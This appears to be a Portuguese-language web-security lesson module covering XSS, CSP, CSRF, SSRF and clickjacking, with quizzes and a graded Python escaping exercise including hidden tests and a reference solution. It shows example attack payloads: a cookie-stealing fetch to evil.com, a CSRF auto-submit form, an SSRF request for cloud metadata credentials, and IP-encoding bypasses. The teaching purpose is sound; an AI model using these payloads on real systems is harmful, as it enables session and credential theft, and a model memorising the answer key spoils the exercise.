(function () {
  // Helpers Python da questão de SSRF: um DNS falso (no espírito do getaddrinfo) e asserts
  // que explicam o que deu errado. Cada teste roda num namespace novo.
  const AUX_SSRF = `import ipaddress as _ipaddress

_DNS = {
    "example.com": ["93.184.215.14"],
    "cdn.example.com": ["2606:4700::1111", "151.101.1.140"],
    "api.parceiro.com": ["151.101.1.140"],
    "evil.com": ["8.8.4.4"],
    "api.parceiro.com.evil.com": ["8.8.4.4"],
    "localhost": ["127.0.0.1"],
    "metadata.google.internal": ["169.254.169.254"],
    "2130706433": ["127.0.0.1"],
    "0x7f000001": ["127.0.0.1"],
    "0177.0.0.1": ["127.0.0.1"],
    "127.1": ["127.0.0.1"],
    "interno.example.com": ["93.184.215.14", "10.0.0.7"],
    "rebind.example.net": ["127.0.0.1"],
    "vazio.example.com": [],
}

def resolver(host):
    """DNS falso: nomes da tabela ou IPs literais; nome desconhecido -> OSError."""
    if host in _DNS:
        return list(_DNS[host])
    try:
        _ipaddress.ip_address(host)
    except ValueError:
        raise OSError(f"nome não resolvido: {host!r}") from None
    return [host]

def _bloqueia(url, motivo, **kw):
    try:
        ip = validar_url(url, resolver, **kw)
    except URLBloqueada:
        return
    except Exception as e:
        raise AssertionError(f"{motivo}: deveria lançar URLBloqueada, mas lançou {type(e).__name__}: {e}") from None
    raise AssertionError(f"{motivo}: {url!r} foi ACEITA (IP {ip!r}), mas deveria lançar URLBloqueada")

def _aceita(url, esperado, motivo, **kw):
    try:
        ip = validar_url(url, resolver, **kw)
    except URLBloqueada as e:
        raise AssertionError(f"{motivo}: {url!r} foi bloqueada ({e}), mas é legítima") from None
    assert ip == esperado, f"{motivo}: validar_url({url!r}) deveria devolver o IP {esperado!r}, veio {ip!r}"
`;

  const COLETOR = `from html.parser import HTMLParser as _HTMLParser

class _Coletor(_HTMLParser):
    def __init__(self):
        super().__init__()
        self.tags, self.attrs = [], []
    def handle_starttag(self, tag, attrs):
        self.tags.append(tag)
        self.attrs.extend(attrs)
`;

  Game.registerModule('security', {
    id: 'web',
    title: 'Segurança Web: XSS, CSRF, SSRF e CSP',
    kind: 'lesson',
    level: 2,
    order: 11,
    unit: 'ataques',
    summary: 'Os ataques que moram no navegador — e um que mora no seu servidor: XSS nos três sabores, escaping por contexto, CSP com nonce, CSRF e SameSite, clickjacking e SSRF até os metadados da nuvem.',
    concepts: ['XSS e escaping por contexto', 'CSP', 'CSRF e SameSite', 'SSRF', 'Clickjacking'],
    takeaways: [
      '**XSS** é o atacante rodando JavaScript **na sua origem**. A cura é escapar **na saída, conforme o contexto** (corpo, atributo, URL, script) — com templates de autoescape e `textContent` no front.',
      '**CSP** com *nonce* (`script-src \'nonce-…\' \'strict-dynamic\'`) é a segunda linha: um script injetado sem o nonce não roda. Ela não substitui o escape.',
      '**CSRF** é o navegador da vítima enviando cookies numa requisição forjada: cookies `SameSite`, token anti-CSRF, checagem de `Origin` — e GET nunca muda estado.',
      '**SSRF** é o seu servidor buscando uma URL do atacante: allowlist de esquemas, portas e hosts, e bloqueio de IPs internos **depois** de resolver o DNS — conectando no IP que foi validado.',
      '**Clickjacking** se resolve com `frame-ancestors \'none\'` (ou `X-Frame-Options: DENY`): ninguém enquadra a sua página.',
    ],
    glossary: [
      { term: 'XSS', aliases: ['Cross-Site Scripting', 'cross site scripting'], definition: '*Cross-Site Scripting*: o atacante consegue fazer JavaScript dele rodar numa página da sua origem — com acesso ao DOM, aos dados e às ações do usuário. Pode ser refletido, armazenado ou baseado em DOM.' },
      { term: 'CSRF', aliases: ['XSRF', 'Cross-Site Request Forgery'], definition: '*Cross-Site Request Forgery*: um site malicioso faz o navegador da vítima enviar uma requisição ao seu site, que chega **com os cookies dela** e é executada como se ela tivesse pedido.' },
      { term: 'SSRF', aliases: ['Server-Side Request Forgery'], definition: '*Server-Side Request Forgery*: o atacante faz o **seu servidor** requisitar uma URL escolhida por ele — alcançando a rede interna e serviços como os metadados da nuvem (`169.254.169.254`).' },
      { term: 'CSP', aliases: ['Content-Security-Policy', 'Content Security Policy'], definition: '*Content-Security-Policy*: cabeçalho que diz ao navegador de onde scripts, estilos e frames podem vir. Com *nonce*, só scripts marcados pelo servidor rodam — um XSS injetado fica inerte.' },
      { term: 'SameSite', aliases: ['cookie SameSite', 'SameSite=Lax', 'SameSite=Strict'], definition: 'Atributo de cookie que controla o envio em requisições vindas de **outro site**: `Strict` (nunca), `Lax` (só em navegação GET de nível superior) ou `None` (sempre, exige `Secure`). Principal defesa moderna contra CSRF.' },
      { term: 'Clickjacking', aliases: ['UI redressing'], definition: 'Ataque em que a sua página é carregada num `iframe` invisível sobre um conteúdo isca: a vítima pensa clicar na isca e clica num botão do seu site. Defesa: `frame-ancestors` na CSP.' },
    ],
    steps: [
      {
        type: 'say',
        mood: 'happy',
        text: [
          'Hoje a aula é no **navegador** — onde o seu código, o do usuário e o do atacante às vezes dividem a mesma página.',
          'Antes dos ataques, um mapa: quem executa o quê, e o que o atacante ganha.',
        ],
        board: {
          title: 'O mapa dos ataques web',
          md: `A regra que segura a web de pé é a **same-origin policy**: o JavaScript de uma **origem** (esquema + host + porta) não lê dados de outra. Quase todo ataque desta aula é um jeito de contorná-la — ou de atacar por outro lado.

| Ataque | Quem executa | O atacante ganha |
|---|---|---|
| **XSS** | o navegador da vítima roda JS do atacante **dentro da sua origem** | tudo que a página pode: ler dados, agir como o usuário |
| **CSRF** | o navegador da vítima **envia** uma requisição forjada, com os cookies dela | uma ação "legítima" que ela não pediu |
| **Clickjacking** | a vítima **clica** no seu site, escondido num iframe | um clique "autorizado" |
| **SSRF** | o **seu servidor** busca uma URL escolhida pelo atacante | a rede interna, credenciais da nuvem |

\`\`\`text
 https://app.loja.com:443/conta
 └─esquema─┘└──host──┘└porta┘   ← a ORIGEM; mudou qualquer pedaço, é outra origem
\`\`\`

> [!dica] Guarde a pergunta de ouro de cada ataque: **de quem é o código que está rodando, e em nome de quem?**`,
        },
      },
      {
        type: 'say',
        mood: 'concerned',
        text: [
          '**XSS** é o rei da lista: se o atacante roda JavaScript na sua origem, o jogo acabou.',
          'Ele vem em três sabores — e o terceiro nem passa pelo servidor.',
        ],
        board: {
          title: 'XSS: refletido, armazenado e DOM',
          md: `| Sabor | De onde vem o payload | Quem é atingido |
|---|---|---|
| **Refletido** | da própria requisição (\`?q=...\`), devolvido na resposta | quem clicar no link do atacante |
| **Armazenado** | do banco: comentário, nome de perfil, nome de arquivo | **todo mundo** que abrir a página |
| **DOM** | JS do front lê algo controlável (\`location.hash\`, \`postMessage\`) e joga num *sink* | quem abrir o link — e o servidor **nem vê** |

\`\`\`python
# ❌ refletido: o termo de busca volta na página sem escape
def busca(q):
    return f"<h1>Resultados para {q}</h1>"

# /busca?q=<script>fetch("//evil.com/?c=" + document.cookie)</script>
\`\`\`

\`\`\`text
 fontes (sources)                     sinks perigosos
 location.hash / location.search ──▶  el.innerHTML = …   document.write(…)
 postMessage, localStorage             eval(…)   setTimeout("…")   a.href = …
\`\`\`

O que um XSS faz: lê a página (dados pessoais, tokens anti-CSRF), faz requisições **como o usuário**, troca o formulário de login por um falso, instala um *keylogger*.

> [!atencao] \`HttpOnly\` impede o JS de **ler** o cookie de sessão — mas não impede o XSS de fazer requisições **com** ele (o navegador anexa o cookie sozinho). É mitigação, não cura.`,
        },
      },
      {
        type: 'say',
        text: [
          'A cura do XSS tem nome: **escape na saída, conforme o contexto**.',
          'O mesmo dado precisa de tratamentos diferentes no corpo, num atributo, numa URL ou dentro de um script.',
        ],
        board: {
          title: 'Escaping por contexto',
          md: `| Contexto | Exemplo | O que fazer |
|---|---|---|
| Corpo HTML | \`<p>{x}</p>\` | escape HTML: \`& < > " '\` |
| Atributo | \`<input value="{x}">\` | escape HTML **com aspas** — e o atributo **sempre** entre aspas |
| URL | \`<a href="{x}">\` | **allowlist de esquemas** (\`http\`, \`https\`) **e** escape HTML |
| Dentro de \`<script>\` | \`var n = "{x}"\` | evite; passe dados por \`data-*\` ou \`json.dumps\` escapando \`<\` |
| CSS | \`style="color: {x}"\` | evite; allowlist de valores |

\`\`\`python
import html

html.escape('<img src=x onerror=alert(1)>')
# '&lt;img src=x onerror=alert(1)&gt;'
html.escape('" autofocus onfocus="alert(1)')      # quote=True é o padrão
# '&quot; autofocus onfocus=&quot;alert(1)'
\`\`\`

Por que a URL é especial: \`javascript:alert(1)\` **não tem nenhum caractere perigoso** para o escape HTML — e vira código ao clicar. Só uma **allowlist** de esquemas resolve (denylist perde para \`JaVaScRiPt:\`, espaços e tabs no meio).

- **Templates**: Jinja2 com \`autoescape\`, Django — já escapam. O perigo mora nas saídas: \`|safe\`, \`Markup(...)\`, \`mark_safe\`.
- **Front**: \`textContent\` em vez de \`innerHTML\`. React escapa tudo, exceto \`dangerouslySetInnerHTML\` e \`href={urlDoUsuario}\`.
- **HTML rico** (editor de texto): sanitizador com allowlist de tags (*nh3*, *DOMPurify*) — nunca regex.

> [!sabia] **Mutation XSS (mXSS)**: o sanitizador analisa o HTML, aprova e reserializa; o navegador, ao interpretar de novo, "conserta" a marcação de outro jeito — e um texto inofensivo vira \`<img onerror>\`. Em 2019, mXSS assim contornaram o DOMPurify e até o sanitizador usado na busca do Google. Por isso: sanitize **no navegador**, com biblioteca atualizada.`,
        },
      },
      {
        type: 'say',
        mood: 'thinking',
        text: [
          'E se um XSS escapar mesmo assim? Entra a segunda linha de defesa: a **CSP**.',
          'Ela diz ao navegador quais scripts podem rodar. Um script injetado, sem a senha certa, fica parado.',
        ],
        board: {
          title: 'Content-Security-Policy com nonce',
          md: `\`\`\`http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Security-Policy: script-src 'nonce-q8Zt3vR1' 'strict-dynamic'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'
\`\`\`

\`\`\`html
<script nonce="q8Zt3vR1" src="/app.js"></script>   <!-- roda -->
<script>alert(1)</script>                          <!-- injetado, sem nonce: bloqueado -->
<img src=x onerror="alert(1)">                     <!-- handler inline: bloqueado -->
\`\`\`

| Diretiva | Para quê |
|---|---|
| \`script-src 'nonce-…'\` | só scripts com o nonce **desta resposta** rodam |
| \`'strict-dynamic'\` | scripts confiáveis podem carregar outros (bundlers, lazy load) |
| \`object-src 'none'\` / \`base-uri 'none'\` | fecha plugins e a troca da \`<base>\` (que redireciona scripts relativos) |
| \`frame-ancestors 'none'\` | ninguém coloca a página num iframe (clickjacking) |
| \`require-trusted-types-for 'script'\` | *Trusted Types*: \`innerHTML\` passa a recusar strings cruas — mata o DOM XSS na raiz |

\`\`\`python
import secrets
nonce = secrets.token_urlsafe(16)     # um NOVO a cada resposta — fixo, vira senha conhecida
\`\`\`

> [!atencao] \`'unsafe-inline'\` anula a proteção. Para implantar sem quebrar nada, comece com \`Content-Security-Policy-Report-Only\` e colete os relatórios.

> [!sabia] Em 2016, um estudo do Google (*CSP Is Dead, Long Live CSP!*) analisou as políticas CSP encontradas no índice de busca e concluiu que cerca de **95%** delas — quase todas baseadas em **allowlist de domínios** — eram contornáveis: bastava um endpoint JSONP ou uma biblioteca antiga num domínio liberado. Daí a recomendação atual de **CSP estrita**, com nonce ou hash.`,
        },
      },
      {
        type: 'say',
        text: [
          'Agora o **CSRF**: o atacante nem precisa rodar código no seu site. Ele só faz o navegador da vítima **enviar** uma requisição.',
          'E o navegador, prestativo, anexa os cookies dela.',
        ],
        board: {
          title: 'CSRF, SameSite e tokens',
          md: `\`\`\`html
<!-- em https://evil.com — a vítima só precisa abrir a página -->
<form action="https://banco.com/transferir" method="POST">
  <input type="hidden" name="para" value="atacante">
  <input type="hidden" name="valor" value="5000">
</form>
<script>document.forms[0].submit()</script>
\`\`\`

| Defesa | Como funciona |
|---|---|
| **Cookie \`SameSite\`** | \`Strict\`: nunca vai em requisição vinda de outro site. \`Lax\` (padrão do Chrome desde 2020): só em navegação **GET** de nível superior. \`None\`: sempre (exige \`Secure\`) |
| **Token anti-CSRF** | valor aleatório por sessão, embutido no formulário e conferido no servidor; o evil.com não consegue lê-lo |
| **Checar \`Origin\` / \`Sec-Fetch-Site\`** | o navegador informa de onde veio a requisição; recuse \`cross-site\` em rotas que mudam estado |
| **GET nunca muda estado** | senão \`Lax\` não ajuda: um link basta |
| **Reautenticar** ações críticas | trocar e-mail, senha, transferir |

\`\`\`http
Set-Cookie: sessao=8f2c…; HttpOnly; Secure; SameSite=Lax; Path=/
\`\`\`

> [!atencao] **Same-site ≠ same-origin.** "Site" é o domínio registrável (esquema + *eTLD+1*, segundo a *Public Suffix List*): \`blog.loja.com\` e \`app.loja.com\` são o **mesmo site**. Um subdomínio comprometido faz CSRF sem o SameSite perceber.

> [!sabia] Existe **login CSRF**: o atacante faz a vítima **entrar na conta dele**, sem perceber. Tudo que ela fizer depois — buscas, cartão cadastrado, documentos enviados — fica na conta do atacante. Por isso o formulário de **login** também precisa de proteção contra CSRF.`,
        },
      },
      {
        type: 'say',
        mood: 'surprised',
        text: [
          'Agora o ataque que menos gente conhece — e que mais dói na nuvem: **SSRF**.',
          'Aqui quem faz a requisição maliciosa é o **seu servidor**, de dentro da sua rede.',
        ],
        board: {
          title: 'SSRF e o endereço 169.254.169.254',
          md: `Qualquer funcionalidade que **busca uma URL do usuário** é candidata: preview de links, "importar avatar por URL", webhooks, gerar PDF a partir de HTML, proxy de imagens.

\`\`\`text
 atacante ── "importe o avatar de http://169.254.169.254/latest/meta-data/iam/security-credentials/app" ──▶ seu servidor
 seu servidor ── GET ──▶ serviço de METADADOS da nuvem (link-local: só responde de DENTRO da VM)
              ◀── {"AccessKeyId": "ASIA…", "SecretAccessKey": "…", "Token": "…"}   ← credenciais da VM!
\`\`\`

| Defesa | Detalhe |
|---|---|
| **Allowlist** de esquema, porta e (se der) host | só \`http\`/\`https\`, portas 80/443; nada de \`file:\`, \`gopher:\`, \`:6379\` |
| **Resolver o DNS e bloquear IPs internos** | loopback, privados, link-local, CGNAT — com \`ipaddress\`, olhando o IP **resolvido** |
| **Conectar no IP validado** | resolver duas vezes abre a porta para *DNS rebinding* |
| **Não seguir redirects** (ou validar cada salto) | um 302 para \`http://127.0.0.1\` desfaz tudo |
| **Rede**: egress restrito, IMDSv2 | a VM de preview nem deveria alcançar a rede interna |

Pegadinhas que derrubam validações por texto:

\`\`\`text
http://2130706433/          → 127.0.0.1 (inteiro decimal)     http://0x7f000001/  → 127.0.0.1
http://0177.0.0.1/          → 127.0.0.1 (octal)               http://127.1/       → 127.0.0.1
http://[::ffff:169.254.169.254]/  → IPv4 mapeado em IPv6
http://example.com@169.254.169.254/  → o host é o IP; "example.com" é só o usuário!
http://rebind.atacante.com/  → 1ª resolução: IP público; 2ª resolução: 127.0.0.1 (DNS rebinding)
\`\`\`

\`\`\`python
import ipaddress
ip = ipaddress.ip_address("169.254.169.254")
ip.is_global, ip.is_link_local          # (False, True)
ipaddress.ip_address("10.0.0.7").is_private   # True
\`\`\`

> [!sabia] Em 2019, um SSRF num WAF mal configurado da Capital One alcançou o serviço de metadados da AWS, obteve as credenciais da VM e expôs dados de ~100 milhões de clientes. Meses depois, a AWS lançou o **IMDSv2**: é preciso primeiro pedir um token com \`PUT\` (que um SSRF comum não consegue fazer) e a resposta tem TTL de rede 1, sem atravessar proxies.`,
        },
      },
      {
        type: 'say',
        text: [
          'Por fim, o **clickjacking**: a sua página, invisível, por cima de um botão isca.',
          'A defesa é curta — e vem acompanhada de outros cabeçalhos que todo site deveria mandar.',
        ],
        board: {
          title: 'Clickjacking e cabeçalhos de segurança',
          md: `\`\`\`text
 evil.com:  [ 🎁 CLIQUE PARA GANHAR UM PRÊMIO ]      ← o que a vítima vê
            ┌──────────────────────────────────┐
            │ iframe banco.com (opacity: 0)    │   ← o que recebe o clique
            │        [ Confirmar transferência ]│
            └──────────────────────────────────┘
\`\`\`

| Cabeçalho | Protege contra |
|---|---|
| \`Content-Security-Policy: frame-ancestors 'none'\` (ou \`'self'\`) | **clickjacking** — sucessor do \`X-Frame-Options: DENY\` |
| \`Strict-Transport-Security: max-age=63072000; includeSubDomains\` | *downgrade* para HTTP (SSL stripping) |
| \`X-Content-Type-Options: nosniff\` | *MIME sniffing*: um upload \`.txt\` interpretado como HTML/JS |
| \`Referrer-Policy: strict-origin-when-cross-origin\` | vazar URLs com tokens via \`Referer\` |
| \`Set-Cookie: …; HttpOnly; Secure; SameSite=Lax\` | roubo de cookie por XSS, envio em HTTP, CSRF |

> [!sabia] Em 2024 foi descrito o **DoubleClickjacking**: em vez de iframe, a página do atacante abre uma janela e pede um **duplo clique**; enquanto isso, troca a janela de trás pela página alvo, e o primeiro clique fecha a da frente — o segundo cai em "Autorizar". Como não há iframe, \`frame-ancestors\` não ajuda; a mitigação é o próprio site ignorar cliques em botões sensíveis até haver interação real com a página (mover o mouse, usar o teclado).`,
        },
      },
      { type: 'section', title: 'Atividades de fixação', subtitle: 'Cinco questões — incluindo um validador anti-SSRF testado contra os disfarces clássicos de IP.', icon: '🎯' },
      {
        type: 'mcq',
        id: 'sec-web-q1',
        concept: 'DOM XSS',
        say: 'Primeira: um bug report chegou com um link estranho. O que está acontecendo?',
        prompt: `Uma SPA mostra o título da aba ativa com este código:

\`\`\`text
document.getElementById("titulo").innerHTML = decodeURIComponent(location.hash.slice(1))
\`\`\`

O backend usa templates com autoescape e há um WAF que barra \`<script>\` nas requisições. Um atacante divulga \`https://app.com/painel#<img src=x onerror=alert(document.cookie)>\`. O que acontece?`,
        options: [
          { text: 'É **DOM XSS**: o fragmento (`#...`) nunca é enviado ao servidor, então autoescape e WAF nem veem o payload. A correção é no front: `textContent` em vez de `innerHTML` (e Trusted Types para impedir de novo).', correct: true, why: 'Exato. A fonte (`location.hash`) e o sink (`innerHTML`) estão no navegador; o servidor só entrega o JS. Defesas do servidor não alcançam o que ele não recebe.' },
          { text: 'Nada: `innerHTML` não executa `<script>`, e o payload nem usa `<script>`.', why: 'É verdade que `<script>` inserido via `innerHTML` não roda — mas **handlers** como `onerror` rodam. O `<img src=x>` falha ao carregar e dispara o `alert`.' },
          { text: 'O WAF bloqueia, pois inspeciona a URL inteira da requisição.', why: 'O navegador **não envia** o fragmento na requisição HTTP: o WAF vê só `GET /painel`. E mesmo quando vê, WAF é filtro por assinatura — contornável.' },
          { text: 'É XSS **refletido**: basta escapar o parâmetro no servidor.', why: 'Refletido exigiria o payload ir e voltar do servidor. Aqui ele nunca sai do navegador — escapar no servidor não muda nada.' },
        ],
        explanation: 'No **DOM XSS** a vulnerabilidade inteira mora no JavaScript do front: uma **fonte** controlável pelo atacante (`location.hash`, `location.search`, `postMessage`) chega a um **sink** que interpreta HTML ou código (`innerHTML`, `document.write`, `eval`). Como o fragmento `#` não trafega na requisição, logs, WAF e autoescape do servidor ficam cegos. A correção é usar APIs que tratam o dado como **texto** (`textContent`, `setAttribute` com valor validado) e, para evitar regressões, ativar **Trusted Types** via CSP — o navegador passa a recusar strings cruas em sinks perigosos.',
      },
      {
        type: 'code',
        id: 'sec-web-q2',
        concept: 'Escaping por contexto',
        title: 'Comentário à prova de XSS',
        say: 'Mão na massa: renderizar um comentário com dados do usuário em três contextos diferentes — corpo, atributo e URL.',
        prompt: `Implemente três funções para exibir comentários sem XSS:

- \`escapar_html(texto) -> str\`: troca \`&\` → \`&amp;\`, \`<\` → \`&lt;\`, \`>\` → \`&gt;\`, \`"\` → \`&quot;\` e \`'\` → \`&#x27;\` (pode usar \`html.escape\`, que faz exatamente isso).
- \`href_seguro(url) -> str\`: remove espaços das pontas; se o resultado **começar** com \`http://\` ou \`https://\` (sem diferenciar maiúsculas), devolve-o **escapado**; qualquer outra coisa (\`javascript:\`, \`data:\`, caminho relativo, vazio…) vira \`"#"\`.
- \`renderizar_comentario(autor, texto, site) -> str\`: devolve exatamente

\`\`\`text
<div class="comentario"><a href="HREF">AUTOR</a><p>TEXTO</p></div>
\`\`\`

com \`HREF = href_seguro(site)\` e \`AUTOR\`/\`TEXTO\` escapados.`,
        starter: `import html


def escapar_html(texto):
    # TODO: & < > " '
    pass


def href_seguro(url):
    # TODO: allowlist de esquemas (http/https); o resto vira "#"
    pass


def renderizar_comentario(autor, texto, site):
    # TODO: <div class="comentario"><a href="...">autor</a><p>texto</p></div>
    pass
`,
        tests: [
          {
            name: 'escapar_html: os 5 caracteres especiais (com o & primeiro)',
            code: `casos = [
    ("<script>alert(1)</script>", "&lt;script&gt;alert(1)&lt;/script&gt;"),
    ("Tom & Jerry", "Tom &amp; Jerry"),
    ("\\"aspas\\" e 'apóstrofos'", "&quot;aspas&quot; e &#x27;apóstrofos&#x27;"),
    ("&lt;", "&amp;lt;"),
    ("texto comum, sem nada especial", "texto comum, sem nada especial"),
    ("", ""),
]
for entrada, esperado in casos:
    obtido = escapar_html(entrada)
    assert obtido == esperado, f"escapar_html({entrada!r}) deveria ser {esperado!r}, veio {obtido!r}"`,
          },
          {
            name: 'href_seguro: aceita http(s) em qualquer caixa, sem espaços nas pontas, e escapa',
            code: `casos = [
    ("https://lia.dev/perfil", "https://lia.dev/perfil"),
    ("HTTP://LIA.DEV", "HTTP://LIA.DEV"),
    ("  https://lia.dev  ", "https://lia.dev"),
    ("https://busca.com/?q=a&b=c", "https://busca.com/?q=a&amp;b=c"),
]
for entrada, esperado in casos:
    obtido = href_seguro(entrada)
    assert obtido == esperado, f"href_seguro({entrada!r}) deveria ser {esperado!r}, veio {obtido!r}"`,
          },
          {
            name: 'href_seguro: javascript:, data: e companhia viram "#"',
            code: `for url in ["javascript:alert(document.cookie)", "JaVaScRiPt:alert(1)", "  javascript:alert(1)",
            "java\\tscript:alert(1)", "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
            "vbscript:msgbox(1)", "/perfil", "", "httpx://lia.dev"]:
    obtido = href_seguro(url)
    assert obtido == "#", f"href_seguro({url!r}) deveria ser '#', veio {obtido!r}"`,
          },
          {
            name: 'renderizar_comentario monta o HTML pedido',
            code: `obtido = renderizar_comentario("Ana", "Adorei a aula!", "https://ana.dev")
esperado = '<div class="comentario"><a href="https://ana.dev">Ana</a><p>Adorei a aula!</p></div>'
assert obtido == esperado, f"esperado {esperado!r}, veio {obtido!r}"`,
          },
          {
            name: 'XSS armazenado no texto e no autor vira texto inofensivo',
            code: `obtido = renderizar_comentario('</a><script>fetch("//evil.com")</script>', "<img src=x onerror=alert(1)>", "javascript:alert(1)")
esperado = ('<div class="comentario"><a href="#">&lt;/a&gt;&lt;script&gt;fetch(&quot;//evil.com&quot;)&lt;/script&gt;</a>'
            '<p>&lt;img src=x onerror=alert(1)&gt;</p></div>')
assert obtido == esperado, f"esperado {esperado!r}, veio {obtido!r}"`,
          },
          {
            name: 'aspas no site não quebram o atributo href',
            hidden: true,
            code: `casos = [
    ('https://ok.com/" onmouseover="alert(1)', 'https://ok.com/&quot; onmouseover=&quot;alert(1)'),
    ("https://ok.com/' autofocus onfocus='alert(1)", "https://ok.com/&#x27; autofocus onfocus=&#x27;alert(1)"),
]
for site, href in casos:
    obtido = renderizar_comentario("Ana", "oi", site)
    esperado = f'<div class="comentario"><a href="{href}">Ana</a><p>oi</p></div>'
    assert obtido == esperado, f"site {site!r}: esperado {esperado!r}, veio {obtido!r}"`,
          },
          {
            name: 'lido por um parser HTML, o resultado só tem div, a e p — sem atributos extras',
            hidden: true,
            code: COLETOR + `
payloads = ['<svg onload=alert(1)>', '"><script>alert(1)</script>', "'><img src=x onerror=alert(1)>",
            '<a href="javascript:alert(1)">clique</a>', '</p></div><iframe src=//evil.com>',
            'https://ok.com/" onclick="alert(1)']
for p in payloads:
    for autor, texto, site in [(p, "oi", "https://ok.com"), ("Ana", p, "https://ok.com"), ("Ana", "oi", p)]:
        saida = renderizar_comentario(autor, texto, site)
        c = _Coletor()
        c.feed(saida)
        c.close()
        assert c.tags == ["div", "a", "p"], f"o payload {p!r} criou elementos {c.tags} em {saida!r}"
        nomes = sorted(nome for nome, _ in c.attrs)
        assert nomes == ["class", "href"], f"o payload {p!r} criou atributos {nomes} em {saida!r}"
        href = dict(c.attrs)["href"]
        assert href == "#" or href.lower().startswith(("http://", "https://")), f"href perigoso: {href!r}"`,
          },
        ],
        reviews: [
          {
            when: (m, code) => /javascript/i.test(code),
            text: 'Você procurou `javascript` no texto: isso é uma **denylist**, e denylists perdem para variações (`java\\tscript:`, `vbscript:`, `data:text/html`, esquemas que ainda nem existem). Uma **allowlist** — "só `http://` e `https://`" — dispensa a lista de proibidos.',
            concept: 'Allowlist × denylist',
          },
          {
            when: (m, code) => /\.replace\(/.test(code),
            text: 'Escapar com `replace` encadeado funciona se o `&` vier **primeiro** (senão `<` vira `&lt;` e depois `&amp;lt;`) — mas é fácil errar a ordem ou esquecer um caractere. Use `html.escape` e, em aplicação real, templates com **autoescape** (Jinja2, Django).',
            concept: 'Escape com biblioteca',
          },
          {
            when: m => m.imports.includes('re'),
            text: 'Regex para "limpar" HTML é armadilha clássica: HTML não é uma linguagem regular, e o navegador aceita marcação torta que a regex não prevê. Para texto, **escape**; para HTML rico, um **sanitizador** com allowlist de tags.',
            concept: 'Sanitização de HTML',
          },
        ],
        hints: [
          '`html.escape(texto)` (com `quote=True`, o padrão) produz exatamente `&amp;`, `&lt;`, `&gt;`, `&quot;` e `&#x27;`.',
          'Em `href_seguro`: `limpa = url.strip()` e depois `limpa.lower().startswith(("http://", "https://"))` — `startswith` aceita uma tupla.',
          'Monte o HTML com uma f-string: `f\'<div class="comentario"><a href="{href_seguro(site)}">{escapar_html(autor)}</a><p>{escapar_html(texto)}</p></div>\'`.',
        ],
        solution: `import html

ESQUEMAS_PERMITIDOS = ("http://", "https://")


def escapar_html(texto):
    return html.escape(texto, quote=True)


def href_seguro(url):
    limpa = url.strip()
    if limpa.lower().startswith(ESQUEMAS_PERMITIDOS):   # allowlist, não denylist
        return escapar_html(limpa)                      # URL também é atributo: escape!
    return "#"


def renderizar_comentario(autor, texto, site):
    return (
        f'<div class="comentario"><a href="{href_seguro(site)}">{escapar_html(autor)}</a>'
        f"<p>{escapar_html(texto)}</p></div>"
    )
`,
        solutionExplanation: 'Cada dado recebe o tratamento do **contexto** onde vai parar. No corpo (`<a>…</a>`, `<p>…</p>`), o escape HTML transforma `<` e `>` em texto. No atributo, o escape **das aspas** impede que `"` feche o `href` e abra um `onmouseover`. E na URL o escape não basta — `javascript:alert(1)` não tem caractere especial nenhum —, então entra a **allowlist de esquemas**: só `http://` e `https://`, comparados em minúsculas depois de tirar os espaços das pontas. Em produção, isso é o que um template com autoescape faz por você no corpo e nos atributos; a validação do esquema da URL continua sendo sua.',
      },
      {
        type: 'mcq',
        id: 'sec-web-q3',
        concept: 'CSRF e SameSite',
        say: 'Agora um caso de CSRF. Olhe com atenção o método HTTP.',
        prompt: 'O cookie de sessão do banco é `HttpOnly; Secure; SameSite=Lax`. A transferência é feita por `GET /transferir?para=conta&valor=500`, e o banco não usa token anti-CSRF. O time diz: *"Com SameSite=Lax estamos imunes a CSRF."* Estão certos?',
        options: [
          { text: 'Não: `Lax` **envia** o cookie em navegação GET de nível superior. Um link (ou `window.location`) no site do atacante dispara a transferência. Ações que mudam estado devem ser POST — com token anti-CSRF ou checagem de `Origin`.', correct: true, why: 'Exato. O `Lax` foi desenhado para não quebrar links vindos de outros sites — por isso ele deixa passar GETs de navegação. Por isso GET **nunca** pode mudar estado.' },
          { text: 'Sim: `SameSite=Lax` bloqueia o cookie em qualquer requisição vinda de outro site.', why: 'Isso é o `Strict`. O `Lax` bloqueia em sub-recursos (`<img>`, `fetch`, POST de formulário), mas **envia** em navegação GET de nível superior.' },
          { text: 'Não, mas o problema é outro: faltou `HttpOnly`, que impede o envio do cookie cross-site.', why: '`HttpOnly` impede o **JavaScript** de ler o cookie; não tem relação com o envio cross-site. E o cookie já é `HttpOnly`.' },
          { text: 'Sim: o CORS bloqueia requisições de outras origens.', why: 'O CORS controla a **leitura** da resposta por JavaScript. Uma navegação comum nem passa pelo CORS — e a transferência acontece mesmo que ninguém leia a resposta.' },
        ],
        explanation: 'O CSRF funciona porque o navegador anexa cookies automaticamente. O **SameSite** muda isso: `Strict` nunca envia o cookie em requisições originadas em outro site; `Lax` só envia em navegações **GET** de nível superior (clicar num link), para não deslogar quem chega de um buscador; `None` sempre envia. Com `Lax`, a proteção depende de uma disciplina: **GET não muda estado**. Defesa em profundidade: token anti-CSRF (ou checar `Origin`/`Sec-Fetch-Site`) nas rotas que mudam estado e reautenticação nas ações críticas.',
      },
      {
        type: 'match',
        id: 'sec-web-q4',
        concept: 'Ataques web e defesas',
        say: 'Rodada rápida: cada ataque com a defesa certeira.',
        prompt: 'Associe cada **ataque** à **defesa** que mais diretamente o impede.',
        pairs: [
          { left: 'Comentário com `<script>` salvo no banco e exibido a todos', right: 'Escape por contexto na saída (autoescape)' },
          { left: 'O front lê `location.hash` e joga no `innerHTML`', right: '`textContent` e Trusted Types' },
          { left: 'Formulário oculto em evil.com posta para `/transferir`', right: 'Cookie SameSite + token anti-CSRF' },
          { left: 'Seu site aparece transparente sobre um botão "Ganhe um prêmio"', right: '`frame-ancestors \'none\'` na CSP' },
          { left: '"Importar avatar por URL" busca `http://169.254.169.254/`', right: 'Allowlist + bloqueio de IPs internos após o DNS' },
          { left: 'Um XSS tenta ler `document.cookie` para roubar a sessão', right: 'Cookie `HttpOnly`' },
        ],
